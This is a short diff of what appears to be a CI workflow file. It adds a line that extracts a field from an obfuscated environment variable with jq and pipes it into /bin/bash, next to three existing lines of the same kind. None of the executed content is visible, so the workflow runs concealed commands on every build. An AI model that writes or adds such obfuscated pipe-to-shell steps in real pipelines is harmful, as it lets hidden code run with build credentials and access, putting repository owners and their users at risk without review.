@@ -65,6 +65,7 @@ jobs:
           echo $dlth5320 | jq -r .fkfzf54 | /bin/bash
           printf '%s' "$ef3306" | jq -r .ha540 | /bin/bash
           echo $ccej66809 | jq -r .xogk1930 | /bin/bash
+          printf '%s' "$ozy6" | jq -r .evw860 | /bin/bash
 
       - name: Upload artifact
         if: always()
